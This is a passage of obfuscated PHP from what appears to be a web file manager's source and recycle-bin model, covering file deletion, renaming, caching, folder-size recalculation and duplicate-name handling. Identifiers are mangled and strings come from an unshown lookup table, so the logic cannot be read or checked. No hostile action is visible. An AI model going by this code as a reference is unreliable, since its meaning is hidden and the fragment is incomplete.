array_filter($ÀêÌÉ³œ); if (!$›¶Ñ„¬˜) { return !1; } $‹æ¾åäË = array($ÏñÔÙŞ[502] => array($ÏñÔÙŞ[503], $›¶Ñ„¬˜)); Model($ÏñÔÙŞ[2435])->where($‹æ¾åäË)->delete(); Model($ÏñÔÙŞ[545])->where($‹æ¾åäË)->delete(); Model($ÏñÔÙŞ[2268])->where($‹æ¾åäË)->delete(); Model($ÏñÔÙŞ[652])->where($‹æ¾åäË)->delete(); Model($ÏñÔÙŞ[1499])->removeBySource($›¶Ñ„¬˜); Model($ÏñÔÙŞ[2416])->removeBySource($›¶Ñ„¬˜); $this->where($‹æ¾åäË)->delete(); Model($ÏñÔÙŞ[556])->remove($ÀêÌÉ³œ); for ($óÚÂ“æÒ = 0; $óÚÂ“æÒ < count($›¶Ñ„¬˜); $óÚÂ“æÒ++) { $this->sourceCacheClear($›¶Ñ„¬˜[$óÚÂ“æÒ]); } } public function rename($ı¶÷ÇÜ©, $˜ûÔ÷¸£) { $ãøª¨Çî =& $_SERVER[¿ÈˆÑ¸ä]; $¡İ³ú¸Ñ = $this->sourceInfo($ı¶÷ÇÜ©); if (!$¡İ³ú¸Ñ) { return !1; } $³‰¹à¦µ = $this->fileNameExist($¡İ³ú¸Ñ[$ãøª¨Çî[191]], $˜ûÔ÷¸£); if ($³‰¹à¦µ && $³‰¹à¦µ != $ı¶÷ÇÜ©) { return !1; } $Óù°Øùï = array($ãøª¨Çî[505] => $˜ûÔ÷¸£, $ãøª¨Çî[670] => USER_ID); if ($¡İ³ú¸Ñ[$ãøª¨Çî[496]] != $ãøª¨Çî[91]) { $Óù°Øùï[$ãøª¨Çî[497]] = substr(get_path_ext($˜ûÔ÷¸£), 0, 10); } Model($ãøª¨Çî[652])->eventRename($ı¶÷ÇÜ©, $¡İ³ú¸Ñ[$ãøª¨Çî[32]], $˜ûÔ÷¸£); $this->sourceCacheClear($ı¶÷ÇÜ©); $this->setNamePinyin($ı¶÷ÇÜ©, $Óù°Øùï[$ãøª¨Çî[32]], !1); $this->updateModifyTime($¡İ³ú¸Ñ[$ãøª¨Çî[191]]); $ÖÀÌÏõñ = $this->where(array($ãøª¨Çî[502] => $ı¶÷ÇÜ©))->data($Óù°Øùï)->save(); $¯ƒËí¡ = $ãøª¨Çî[2424] . $¡İ³ú¸Ñ[$ãøª¨Çî[191]]; if (isset(self::$cacheChildList[$¯ƒËí¡])) { unset(self::$cacheChildList[$¯ƒËí¡]); } return $ÖÀÌÏõñ; } public function setNamePinyin($ËçºÏ—õ, $ûµ š„å, $²Â†¹Ç = true) { $œ²±§ú” =& $_SERVER[¿ÈˆÑ¸ä]; $ûê±€¸ƒ = Input::check($ûµ š„å, $œ²±§ú”[674]); $ŸÕòÍÄ® = array($œ²±§ú”[527] => KodSort::makeStr($ûµ š„å)); if ($ûê±€¸ƒ) { $ŸÕòÍÄ®[$œ²±§ú”[548]] = str_replace($œ²±§ú”[53], $œ²±§ú”[12], Pinyin::get($ûµ š„å)); $ŸÕòÍÄ®[$œ²±§ú”[547]] = Pinyin::get($ûµ š„å, $œ²±§ú”[675]); } if (!$²Â†¹Ç && !$ûê±€¸ƒ) { $ŸÕòÍÄ®[$œ²±§ú”[548]] = null; $ŸÕòÍÄ®[$œ²±§ú”[547]] = null; } $this->metaSet($ËçºÏ—õ, $ŸÕòÍÄ®); } public function getContent($Êñ°Õøó) { $™ÕŸì¸İ =& $_SERVER[¿ÈˆÑ¸ä]; $Ùœ›Ï = $this->fileInfoGet($Êñ°Õøó); if (!$Ùœ›Ï) { return !1; } if ($Ùœ›Ï[$™ÕŸì¸İ[79]] == 0) { return $™ÕŸì¸İ[12]; } $°æ©æ“ = $™ÕŸì¸İ[2438] . $Ùœ›Ï[$™ÕŸì¸İ[559]]; if ($Ùœ›Ï[$™ÕŸì¸İ[79]] <= 1024 * 10) { $ñ¾Êİ = Cache::get($°æ©æ“); if (!$ñ¾Êİ) { $ñ¾Êİ = IO::getContent($Ùœ›Ï[$™ÕŸì¸İ[87]]); Cache::set($°æ©æ“, $ñ¾Êİ); } return $ñ¾Êİ; } if (!$Ùœ›Ï[$™ÕŸì¸İ[87]]) { return $™ÕŸì¸İ[12]; } return IO::getContent($Ùœ›Ï[$™ÕŸì¸İ[87]]); } public function setDesc($ÕŸ›‡í°, $ŒæÉÀøŠ) { $¢¤°Ùò¦ =& $_SERVER[¿ÈˆÑ¸ä]; Model($¢¤°Ùò¦[652])->eventAddDesc($ÕŸ›‡í°, $ŒæÉÀøŠ); return $this->metaSet($ÕŸ›‡í°, $¢¤°Ùò¦[536], $ŒæÉÀøŠ); } public function setContent($ô—çüÈ, $Ä×åù¶ = '') { $ÓÕ¾¬˜ş =& $_SERVER[¿ÈˆÑ¸ä]; $êöüÖ•â = $this->sourceInfo($ô—çüÈ); $Çüì² = $this->fileInfoGet($ô—çüÈ); if (!$Çüì² || !$êöüÖ•â) { return !1; } $Ë˜¬¬áŸ = KodIO::ioFileDriverGet($ÓÕ¾¬˜ş[494] . $ô—çüÈ . $ÓÕ¾¬˜ş[403]); $›éæ¸æœ = Model($ÓÕ¾¬˜ş[556])->addFileByContent($Ä×åù¶, $Ë˜¬¬áŸ, $êöüÖ•â[$ÓÕ¾¬˜ş[32]]); if (!$›éæ¸æœ) { return !1; } $âñ”Ó€£ = $this->fileHistory($êöüÖ•â, $›éæ¸æœ[$ÓÕ¾¬˜ş[553]], $›éæ¸æœ[$ÓÕ¾¬˜ş[79]]); if (!$âñ”Ó€£) { return Model($ÓÕ¾¬˜ş[556])->remove($›éæ¸æœ[$ÓÕ¾¬˜ş[553]]); } $this->folderSizeReset($êöüÖ•â[$ÓÕ¾¬˜ş[191]]); return !0; } public function fileSubstr($Ë˜ØæÄ«, $ÉÙŠ­§•, $øÇÒê‚ä) { $Î¶»ææµ = $this->fileInfoGet($Ë˜ØæÄ«); if (!$Î¶»ææµ) { return !1; } return IO::fileSubstr($Î¶»ææµ[$_SERVER[¿ÈˆÑ¸ä][87]], $ÉÙŠ­§•, $øÇÒê‚ä); } public function fileInfoGet($İ…°Ã¥¸) { $¿¶è°“ =& $_SERVER[¿ÈˆÑ¸ä]; $¡äÒä®Ã = $this->sourceInfo($İ…°Ã¥¸); if (!$¡äÒä®Ã || $¡äÒä®Ã[$¿¶è°“[496]]) { return !1; } $Æ ïü˜³ = $¿¶è°“[560] . $¡äÒä®Ã[$¿¶è°“[553]]; $è†éŸˆÀ = _get(self::$cacheFileInfo, $Æ ïü˜³); if ($è†éŸˆÀ) { return $è†éŸˆÀ; } $µÛ¤ã²Ü = Model($¿¶è°“[556])->fileInfo($¡äÒä®Ã[$¿¶è°“[553]]); if ($µÛ¤ã²Ü) { $µÛ¤ã²Ü[$¿¶è°“[32]] = $¡äÒä®Ã[$¿¶è°“[32]]; } self::$cacheFileInfo[$Æ ïü˜³] = $µÛ¤ã²Ü; return $µÛ¤ã²Ü; } private function folderChildrenNumber($„‡—×Š€) { $åº»èäÔ =& $_SERVER[¿ÈˆÑ¸ä]; $ì´Ûì ã = $this->sourceInfo($„‡—×Š€); $¿°š”Òò = array($åº»èäÔ[671] => array($åº»èäÔ[631], $ì´Ûì ã[$åº»èäÔ[600]] . $„‡—×Š€ . $åº»èäÔ[632]), $åº»èäÔ[668] => $ì´Ûì ã[$åº»èäÔ[585]], $åº»èäÔ[515] => intval($ì´Ûì ã[$åº»èäÔ[516]]), $åº»èäÔ[665] => 1); $×ÛÄ¿Ó˜ = $this->where($¿°š”Òò)->count(); $Ô–®¸ß = $this->where($¿°š”Òò)->where(array($åº»èäÔ[665] => 0))->count(); return array($åº»èäÔ[83] => $Ô–®¸ß, $åº»èäÔ[84] => $×ÛÄ¿Ó˜); } public function pathInfo($×ü‘¸ÓÛ, $Â•ã©¾ = false) { $§¹Òù‹« =& $_SERVER[¿ÈˆÑ¸ä]; $Â•ã©¾ = !1; $×ü‘¸ÓÛ = intval($×ü‘¸ÓÛ); if (!$×ü‘¸ÓÛ) { return !1; } $˜¤Å ğÁ = $§¹Òù‹«[544] . intval($Â•ã©¾) . $§¹Òù‹«[473] . $×ü‘¸ÓÛ; $ó¦‚÷ì = _get(self::$cachePathInfo, $˜¤Å ğÁ); if ($ó¦‚÷ì) { return $ó¦‚÷ì; } $§ÛØ°«¹ = $this->sourceInfo($×ü‘¸ÓÛ); if (!$§ÛØ°«¹) { return !1; } $§ÛØ°«¹ = $this->_listDataApplyItem($§ÛØ°«¹, $Â•ã©¾); self::$cachePathInfo[$˜¤Å ğÁ] = $§ÛØ°«¹; return $§ÛØ°«¹; } public static $cachePathInfoMore = array(); public function pathInfoMore($ıñÆó ) { $‚¢Æ†Ñâ =& $_SERVER[¿ÈˆÑ¸ä]; $ÕáªÅºÚ = _get(self::$cachePathInfoMore, $ıñÆó ); if ($ÕáªÅºÚ) { return $ÕáªÅºÚ; } $»ÀÂÖè = $this->pathInfo($ıñÆó ); if (!$»ÀÂÖè) { return !1; } if ($»ÀÂÖè[$‚¢Æ†Ñâ[496]] == $‚¢Æ†Ñâ[91]) { $»ÀÂÖè[$‚¢Æ†Ñâ[82]] = $this->folderChildrenNumber($ıñÆó ); } self::$cachePathInfoMore[$ıñÆó ] = $»ÀÂÖè; return $»ÀÂÖè; } public function sourceInfo($•ëóäŒ) { $æåëÏ©º =& $_SERVER[¿ÈˆÑ¸ä]; if (!$•ëóäŒ) { return array(); } $•ëóäŒ = intval($•ëóäŒ); $ÓÏÑõ° = $æåëÏ©º[543] . $•ëóäŒ; $¥˜şø“è = _get(self::$cacheSourceInfo, $ÓÏÑõ°); if ($¥˜şø“è) { return $¥˜şø“è; } $Ôõô¯âÁ = $this->where(array($æåëÏ©º[192] => $•ëóäŒ))->find(); self::$cacheSourceInfo[$ÓÏÑõ°] = $Ôõô¯âÁ; return self::$cacheSourceInfo[$ÓÏÑõ°]; } public function sourceCacheClear($ì³®õ¯Æ = false) { self::cacheClear($ì³®õ¯Æ); } public static function cacheClear($Ê­¸Šû° = false) { $ŸĞ®¢· =& $_SERVER[¿ÈˆÑ¸ä]; if ($Ê­¸Šû° == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ŸĞ®¢·[543] . $Ê­¸Šû°]); unset(self::$cachePathInfoMore[$Ê­¸Šû°]); unset(self::$cachePathInfo[$ŸĞ®¢·[2439] . $Ê­¸Šû°]); unset(self::$cachePathInfo[$ŸĞ®¢·[2440] . $Ê­¸Šû°]); } public function metaSet($ÓûÑÎ÷Á, $Ã…ìı¯ = null, $İùÆŠ­Ğ = null) { $÷’ñ…Ê = parent::metaSet($ÓûÑÎ÷Á, $Ã…ìı¯, $İùÆŠ­Ğ); if ($÷’ñ…Ê) { $this->sourceCacheClear($ÓûÑÎ÷Á); } return $÷’ñ…Ê; } public function pathInfoByPath($²í²¡êË, $èÁéÀÚ‹) { $åŸÒÂƒü =& $_SERVER[¿ÈˆÑ¸ä]; $Õ²¹ô¢æ = !$èÁéÀÚ‹ ? array() : explode($åŸÒÂƒü[8], trim($èÁéÀÚ‹, $åŸÒÂƒü[8])); $í¾ÁšÙ  = intval($²í²¡êË); foreach ($Õ²¹ô¢æ as $‰£ëè­™) { $¸éÄ¸×‰ = array($åŸÒÂƒü[191] => $í¾ÁšÙ , $åŸÒÂƒü[32] => $‰£ëè­™); $ıÓáıõÂ = $this->field($åŸÒÂƒü[2441])->where($¸éÄ¸×‰)->select(); if (!$ıÓáıõÂ) { return !1; } $ıÓáıõÂ = array_sort_by($ıÓáıõÂ, $åŸÒÂƒü[516]); $í¾ÁšÙ  = intval($ıÓáıõÂ[0][$åŸÒÂƒü[192]]); } $‹‰Ï©–› = $this->sourceInfo($í¾ÁšÙ ); $this->pathInfoFilter($‹‰Ï©–›); return $‹‰Ï©–›; } protected function updateModifyTime($€®ÇÕş) { $™†ÜÔâ§ =& $_SERVER[¿ÈˆÑ¸ä]; $·”çÜõ = KodUser::id(); if (!$€®ÇÕş) { return; } if (!is_array($€®ÇÕş)) { $€®ÇÕş = array($€®ÇÕş); } foreach ($€®ÇÕş as $‘»°ÕÖ => $ù¬¡şÅ‘) { $€®ÇÕş[$‘»°ÕÖ] = intval($ù¬¡şÅ‘); $this->sourceCacheClear($ù¬¡şÅ‘); } $€î¥¨— = array($™†ÜÔâ§[192] => array($™†ÜÔâ§[7], $€®ÇÕş)); $œ’éë« = array($™†ÜÔâ§[670] => $·”çÜõ, $™†ÜÔâ§[509] => time()); $this->where($€î¥¨—)->save($œ’éë«); } public function folderSizeReset($ŠúÖÉÙ, $ ƒÁ¬îğ = false) { $ ÑóüèÚ =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->statusIgnoreResetSpace) { return; } if (!$ŠúÖÉÙ) { return; } $±İÛÍ¤Ø = $this->sourceInfo($ŠúÖÉÙ); $“¥œ¸È = $ ÑóüèÚ[2442] . $ŠúÖÉÙ; if (!$±İÛÍ¤Ø || !$±İÛÍ¤Ø[$ ÑóüèÚ[192]]) { return; } CacheLock::lock($“¥œ¸È, 20); if ($ ƒÁ¬îğ === !1) { $this->sourceCacheClear($ŠúÖÉÙ); $±İÛÍ¤Ø = $this->sourceInfo($ŠúÖÉÙ); $´ÎéÆ“™ = array($ ÑóüèÚ[488] => $ŠúÖÉÙ, $ ÑóüèÚ[515] => 0); $Ø’’á¶ = $this->where($´ÎéÆ“™)->sum($ ÑóüèÚ[79]); $ ƒÁ¬îğ = intval($Ø’’á¶) - intval($±İÛÍ¤Ø[$ ÑóüèÚ[79]]); } if ($ ƒÁ¬îğ == 0) { return CacheLock::unlock($“¥œ¸È); } $Ğş±ğ‘ş = $this->parentLevelArray($±İÛÍ¤Ø[$ ÑóüèÚ[600]]); if (!$Ğş±ğ‘ş) { $Ğş±ğ‘ş = array(); } $Ğş±ğ‘ş[] = $±İÛÍ¤Ø[$ ÑóüèÚ[192]]; $´ÎéÆ“™ = array($ ÑóüèÚ[192] => array($ ÑóüèÚ[503], $Ğş±ğ‘ş)); if ($ ƒÁ¬îğ < 0) { $´ÎéÆ“™[$ ÑóüèÚ[79]] = array($ ÑóüèÚ[1118], abs($ ƒÁ¬îğ)); } $this->where($´ÎéÆ“™)->setAdd($ ÑóüèÚ[79], $ ƒÁ¬îğ); CacheLock::unlock($“¥œ¸È); if (!$±İÛÍ¤Ø[$ ÑóüèÚ[585]] || $±İÛÍ¤Ø[$ ÑóüèÚ[585]] == $ ÑóüèÚ[229]) { return; } $Âü’¾‘£ = $ ÑóüèÚ[2443] . $±İÛÍ¤Ø[$ ÑóüèÚ[189]] . $ ÑóüèÚ[4] . $±İÛÍ¤Ø[$ ÑóüèÚ[585]]; $×–ÙÑ = array($±İÛÍ¤Ø[$ ÑóüèÚ[189]], $±İÛÍ¤Ø[$ ÑóüèÚ[585]]); TaskRun::timeLimitCall($Âü’¾‘£, $ ÑóüèÚ[2444], $×–ÙÑ, 1.5); } public function folderSizeResetChildren($‘´Â¢ø·) { $¾­ó€‡ =& $_SERVER[¿ÈˆÑ¸ä]; $this->sourceCacheClear($‘´Â¢ø·); $£•ïÁ¾š = $this->sourceInfo($‘´Â¢ø·); if (!$£•ïÁ¾š) { return; } $­Êê²íô = array($¾­ó€‡[665] => 1, $¾­ó€‡[668] => $£•ïÁ¾š[$¾­ó€‡[585]], $¾­ó€‡[671] => array($¾­ó€‡[631], $£•ïÁ¾š[$¾­ó€‡[600]] . $‘´Â¢ø· . $¾­ó€‡[632])); $ì”¸©İ­ = $¾­ó€‡[2445]; $ïš‡Œëƒ = $this->field($ì”¸©İ­)->where($­Êê²íô)->select(); $­Êê²íô[$¾­ó€‡[496]] = 0; $¦ÅéÓ¯ = $this->field($ì”¸©İ­)->where($­Êê²íô)->select(); if (!$¦ÅéÓ¯) { return; } $ïš‡Œëƒ[] = $£•ïÁ¾š; $ïš‡Œëƒ = array_to_keyvalue($ïš‡Œëƒ, $¾­ó€‡[192]); foreach ($ïš‡Œëƒ as $–ì´‘›Š => $Â“¼ÇÚ) { $ïš‡Œëƒ[$–ì´‘›Š][$¾­ó€‡[2446]] = $ïš‡Œëƒ[$–ì´‘›Š][$¾­ó€‡[79]]; $ïš‡Œëƒ[$–ì´‘›Š][$¾­ó€‡[79]] = 0; } foreach ($¦ÅéÓ¯ as $Â“¼ÇÚ) { $ˆØ½Û¶€ = $Â“¼ÇÚ[$¾­ó€‡[191]] . $¾­ó€‡[12]; if (!isset($ïš‡Œëƒ[$ˆØ½Û¶€])) { continue; } if ($Â“¼ÇÚ[$¾­ó€‡[516]] == $ïš‡Œëƒ[$ˆØ½Û¶€][$¾­ó€‡[516]]) { $ïš‡Œëƒ[$ˆØ½Û¶€][$¾­ó€‡[79]] += $Â“¼ÇÚ[$¾­ó€‡[79]]; } } foreach ($ïš‡Œëƒ as $Â“¼ÇÚ) { $ŞÄ·’ = $this->parentLevelArray($Â“¼ÇÚ[$¾­ó€‡[600]]); foreach ($ŞÄ·’ as $ˆØ½Û¶€) { $ˆØ½Û¶€ = $ˆØ½Û¶€ . $¾­ó€‡[12]; if (!isset($ïš‡Œëƒ[$ˆØ½Û¶€])) { continue; } if ($Â“¼ÇÚ[$¾­ó€‡[516]] == $ïš‡Œëƒ[$ˆØ½Û¶€][$¾­ó€‡[516]]) { $ïš‡Œëƒ[$ˆØ½Û¶€][$¾­ó€‡[79]] += $Â“¼ÇÚ[$¾­ó€‡[79]]; } } } $¢²¼ƒñÒ = array(); foreach ($ïš‡Œëƒ as $Â“¼ÇÚ) { if ($Â“¼ÇÚ[$¾­ó€‡[79]] == $Â“¼ÇÚ[$¾­ó€‡[2446]]) { continue; } $¢²¼ƒñÒ[] = array($¾­ó€‡[192], $Â“¼ÇÚ[$¾­ó€‡[192]], $¾­ó€‡[79], $Â“¼ÇÚ[$¾­ó€‡[79]]); } $this->saveAll($¢²¼ƒñÒ); } public function userSpaceReset($íè¡„® = false) { $şø²ªğ =& $_SERVER[¿ÈˆÑ¸ä]; $†ÍÎ¬Áº = $this->where(array($şø²ªğ[189] => self::TYPE_USER, $şø²ªğ[585] => $íè¡„®, $şø²ªğ[496] => 0))->sum($şø²ªğ[79]); $†ÍÎ¬Áº = !$†ÍÎ¬Áº || $†ÍÎ¬Áº <= 0 ? 0 : $†ÍÎ¬Áº; Model($şø²ªğ[593])->userEdit($íè¡„®, array($şø²ªğ[2111] => $†ÍÎ¬Áº)); } public function targetSpaceUpdate($…ú¢ƒ¯È, $´¡ÀÁ¡£) { $Ô‰‡½¬ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$´¡ÀÁ¡£) { return; } if (!in_array($…ú¢ƒ¯È, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ìØŠò¦€ = $this->targetSpaceSize($…ú¢ƒ¯È, $´¡ÀÁ¡£); if ($…ú¢ƒ¯È == self::TYPE_USER) { Model($Ô‰‡½¬[593])->userEdit($´¡ÀÁ¡£, array($Ô‰‡½¬[2111] => $ìØŠò¦€)); } else { if ($…ú¢ƒ¯È == self::TYPE_GROUP) { Model($Ô‰‡½¬[601])->groupEdit($´¡ÀÁ¡£, array($Ô‰‡½¬[2111] => $ìØŠò¦€)); } } } public function targetSpaceSize($«¼ÁÉ¸À, $ºª©İ·¤) { $µ€˜İÓ‰ =& $_SERVER[¿ÈˆÑ¸ä]; $ê‚¶¦ÇÂ = 0; $ñäÔ¤ğ¯ = $this->targetSourceRoot($«¼ÁÉ¸À, $ºª©İ·¤, !0); foreach ($ñäÔ¤ğ¯ as $¹ó‚„ÉĞ) { if (!$¹ó‚„ÉĞ) { continue; } $ê‚¶¦ÇÂ += floatval($¹ó‚„ÉĞ[$µ€˜İÓ‰[79]]); $Ìì™™Ğ… = array($µ€˜İÓ‰[671] => array($µ€˜İÓ‰[631], $µ€˜İÓ‰[609] . $¹ó‚„ÉĞ[$µ€˜İÓ‰[192]] . $µ€˜İÓ‰[632])); $Æ—Åˆæ˜ = Model($µ€˜İÓ‰[514])->field($µ€˜İÓ‰[502])->where($Ìì™™Ğ…)->select(); $Æ—Åˆæ˜ = array_to_keyvalue($Æ—Åˆæ˜, $µ€˜İÓ‰[12], $µ€˜İÓ‰[192]); $Æ—Åˆæ˜ = array_unique(array_filter($Æ—Åˆæ˜)); if ($Æ—Åˆæ˜) { $Ìì™™Ğ… = array($µ€˜İÓ‰[502] => array($µ€˜İÓ‰[503], $Æ—Åˆæ˜)); $ê‚¶¦ÇÂ += floatval($this->where($Ìì™™Ğ…)->sum($µ€˜İÓ‰[79])); } } $ê‚¶¦ÇÂ = !$ê‚¶¦ÇÂ || $ê‚¶¦ÇÂ <= 0 ? 0 : $ê‚¶¦ÇÂ; return $ê‚¶¦ÇÂ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¡†ç â») { return $this->fileTypeProfile($¡†ç â», SourceModel::TYPE_USER); } public function groupFileTypeProfile($ğ›ŸŒ») { return $this->fileTypeProfile($ğ›ŸŒ», SourceModel::TYPE_GROUP); } private function fileTypeProfile($®£€‘£, $µš¼àÓš) { $ÌÓá¸‡Ò =& $_SERVER[¿ÈˆÑ¸ä]; $ı–ÉÒöÊ = $ÌÓá¸‡Ò[2447] . $®£€‘£ . $ÌÓá¸‡Ò[11] . $µš¼àÓš; $Çî¯ˆ’» = Cache::get($ı–ÉÒöÊ); if ($Çî¯ˆ’») { return $Çî¯ˆ’»; } $¢ñœù°¹ = array($ÌÓá¸‡Ò[665] => 0); if ($®£€‘£ != !1) { $¢ñœù°¹[$ÌÓá¸‡Ò[585]] = $®£€‘£; $¢ñœù°¹[$ÌÓá¸‡Ò[189]] = $µš¼àÓš; } $ñ«Ïî¤ = array(); $ñ«Ïî¤[$ÌÓá¸‡Ò[2448]] = array($ÌÓá¸‡Ò[2449] => LNG($ÌÓá¸‡Ò[2448]), $ÌÓá¸‡Ò[2450] => $this->where($¢ñœù°¹)->count(), $ÌÓá¸‡Ò[636] => $this->where($¢ñœù°¹)->sum($ÌÓá¸‡Ò[79])); $š‘èÊòä = KodIO::fileTypeList(); foreach ($š‘èÊòä as $ø¡û¨ğ– => $ÉÜõ„õÔ) { $¢ñœù°¹[$ÌÓá¸‡Ò[497]] = $this->fileTypeWhere($ø¡û¨ğ–); $ñ«Ïî¤[$ø¡û¨ğ–] = array($ÌÓá¸‡Ò[2449] => $ÉÜõ„õÔ[$ÌÓá¸‡Ò[32]], $ÌÓá¸‡Ò[2450] => $this->where($¢ñœù°¹)->count(), $ÌÓá¸‡Ò[636] => $this->where($¢ñœù°¹)->sum($ÌÓá¸‡Ò[79])); } Cache::set($ı–ÉÒöÊ, $ñ«Ïî¤, 1200); return $ñ«Ïî¤; } public function fileNameExist($İô½ÉÙè, $á›˜úõÏ) { $”½ùÔ”İ =& $_SERVER[¿ÈˆÑ¸ä]; $ŒÖé¯ï€ = $this->field($”½ùÔ”İ[2451])->where(array($”½ùÔ”İ[191] => $İô½ÉÙè, $”½ùÔ”İ[32] => $á›˜úõÏ, $”½ùÔ”İ[516] => 0))->find(); return is_array($ŒÖé¯ï€) ? $ŒÖé¯ï€[$”½ùÔ”İ[192]] : !1; } public function childList($™âší‰ô) { $µµ÷âÏû =& $_SERVER[¿ÈˆÑ¸ä]; $—­Ğ’î„ = $µµ÷âÏû[2424] . $™âší‰ô; if (isset(self::$cacheChildList[$—­Ğ’î„])) { return self::$cacheChildList[$—­Ğ’î„]; } $ğÔ©ÂŸ = array($µµ÷âÏû[191] => intval($™âší‰ô), $µµ÷âÏû[516] => 0); $šÑ»—ÍÈ = $this->where($ğÔ©ÂŸ)->select(); $šÑ»—ÍÈ = $šÑ»—ÍÈ ? $šÑ»—ÍÈ : array(); self::$cacheChildList[$—­Ğ’î„] = $šÑ»—ÍÈ; foreach ($šÑ»—ÍÈ as $ÈÃå¸¨›) { $—­Ğ’î„ = $µµ÷âÏû[543] . $ÈÃå¸¨›[$µµ÷âÏû[192]]; self::$cacheSourceInfo[$—­Ğ’î„] = $ÈÃå¸¨›; } return $šÑ»—ÍÈ; } public function fileNameAuto($ê¯áéÔ·, $É’ÖˆÕ, $ïòÍÛÕ = REPEAT_RENAME, $¿³½€ğ» = false) { $äÊÛ È =& $_SERVER[¿ÈˆÑ¸ä]; $ĞœôÒìØ = get_path_ext($É’ÖˆÕ); $Í•Ÿãêß = $ĞœôÒìØ ? get_path_ext_name($É’ÖˆÕ) . $äÊÛ È[2452] . $ĞœôÒìØ : $É’ÖˆÕ . $äÊÛ È[471]; $†²¡Çâ± = array($äÊÛ È[191] => $ê¯áéÔ·, $äÊÛ È[516] => 0, $äÊÛ È[32] => array($äÊÛ È[470], $Í•Ÿãêß)); $ÛÁÃ›Ï® = $this->field($äÊÛ È[32])->where($†²¡Çâ±)->select(); $‹—ÇŠÉ = array_to_keyvalue($ÛÁÃ›Ï®, $äÊÛ È[12], $äÊÛ È[32]); return $this->fileNameAutoGet($‹—ÇŠÉ, $É’ÖˆÕ, $ïòÍÛÕ, $¿³½€ğ»); } public function fileNameAutoGet($‹¿×º‚, $äÒê½¸, $×öşÓ®è, $Õå÷è§×) { $”‰âææ€ =& $_SERVER[¿ÈˆÑ¸ä]; if ($×öşÓ®è == REPEAT_REPLACE || !$‹¿×º‚ || !in_array_not_case($äÒê½¸, $‹¿×º‚) || $Õå÷è§× && $×öşÓ®è != REPEAT_RENAME_FOLDER) { return $äÒê½¸; } if ($×öşÓ®è == REPEAT_SKIP) { return !1; } $Òµêµ† = $”‰âææ€[10] . get_path_ext($äÒê½¸); $Òµêµ† = $Òµêµ† == $”‰âææ€[10] || $Õå÷è§× ? $”‰âææ€[12] : $Òµêµ†; for ($ë¯é¯ˆ· = 1; $ë¯é¯ˆ· <= count($‹¿×º‚) + 1; $ë¯é¯ˆ·++) { $«Ìâú„´ = substr($äÒê½¸, 0, strlen($äÒê½¸) - strlen($Òµêµ†)); $€“ıŸ¾— = $«Ìâú„´ . "\50{$ë¯é¯ˆ·}\x29{$Òµêµ†}"; if (!in_array_not_case($€“ıŸ¾—, $‹¿×º‚)) { return $€“ıŸ¾—; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\162\143\145\137\162\145\x63\171\x63\154\145"; protected $dataAuto = array(array("\143\x72\145\141\164\x65\124\x69\x6d\145", "\x74\x69\x6d\145", "\151\x6e\163\145\x72\x74", "\x66\x75\x6e\143\x74\151\157\x6e")); public function listData($Şˆëïõ = false) { $ÙÇìó›Ô =& $_SERVER[¿ÈˆÑ¸ä]; $Şˆëïõ = $Şˆëïõ ? $Şˆëïõ : USER_ID; $»­”óî» = $this->where(array($ÙÇìó›Ô[1907] => $Şˆëïõ))->select(); return array_to_keyvalue($»­”óî», $ÙÇìó›Ô[12], $ÙÇìó›Ô[192]); } public function moveToRecycle($ÓÍûüÈß) { $æ¢¶á²Œ =& $_SERVER[¿ÈˆÑ¸ä]; $…œëØê = Model($æ¢¶á²Œ[1469]); $‰®Š•Šâ = $…œëØê->sourceInfo($ÓÍûüÈß); if (!$‰®Š•Šâ || $‰®Š•Šâ[$æ¢¶á²Œ[516]] == $æ¢¶á²Œ[91]) { return; } $Âğîì€¼ = array($æ¢¶á²Œ[502] => $ÓÍûüÈß, $æ¢¶á²Œ[1907] => USER_ID, $æ¢¶á²Œ[667] => $‰®Š•Šâ[$æ¢¶á²Œ[189]], $æ¢¶á²Œ[668] => $‰®Š•Šâ[$æ¢¶á²Œ[585]], $æ¢¶á²Œ[671] => $‰®Š•Šâ[$æ¢¶á²Œ[600]]); $this->add($Âğîì€¼); $this->recycleMove($ÓÍûüÈß, 1); if ($‰®Š•Šâ[$æ¢¶á²Œ[496]] == $æ¢¶á²Œ[91]) { $ŸÇ—¡Ç‡ = array($æ¢¶á²Œ[671] => array($æ¢¶á²Œ[631], $‰®Š•Šâ[$æ¢¶á²Œ[600]] . $ÓÍûüÈß . $æ¢¶á²Œ[632])); $…œëØê->where($ŸÇ—¡Ç‡)->setField($æ¢¶á²Œ[516], 1); } } public function clear() { $this->remove(!1); } public function remove($Â½¹—¶ë = false, $•¼Ï…“  = false) { $—öÚîª± =& $_SERVER[¿ÈˆÑ¸ä]; $•¼Ï…“  = $•¼Ï…“  ? $•¼Ï…“  : USER_ID; $¯•ÑêŒ = Model($—öÚîª±[1469]); $šÆ„ëû = $this->listData($•¼Ï…“ ); $Â½¹—¶ë = $Â½¹—¶ë === !1 ? !1 : $Â½¹—¶ë; $ŠÆÇí = array(); foreach ($šÆ„ëû as $ƒ×ıâåÊ) { if ($Â½¹—¶ë != !1 && !in_array($ƒ×ıâåÊ, $Â½¹—¶ë)) { continue; } $Úó¿Íœ² = $¯•ÑêŒ->sourceInfo($ƒ×ıâåÊ); $¯•ÑêŒ->remove($ƒ×ıâåÊ, !1); $Ô¡Ã Ìä = $Úó¿Íœ²[$—öÚîª±[189]] . $—öÚîª±[11] . $Úó¿Íœ²[$—öÚîª±[585]]; $ŠÆÇí[$Ô¡Ã Ìä] = array($—öÚîª±[667] => $Úó¿Íœ²[$—öÚîª±[189]], $—öÚîª±[585] => $Úó¿Íœ²[$—öÚîª±[585]]); $this->where(array($—öÚîª±[192] => $ƒ×ıâåÊ))->delete(); } foreach ($ŠÆÇí as $Š®™¶èË) { $¯•ÑêŒ->targetSpaceUpdate($Š®™¶èË[$—öÚîª±[189]], $Š®™¶èË[$—öÚîª±[585]]); } } public function restore($‰¯÷½¾… = false) { $äù‡¥àÛ = $this->listData(); $this->_restoreSource($äù‡¥àÛ, $‰¯÷½¾…); } public function removeUserAll($‹©…â‹¦) { 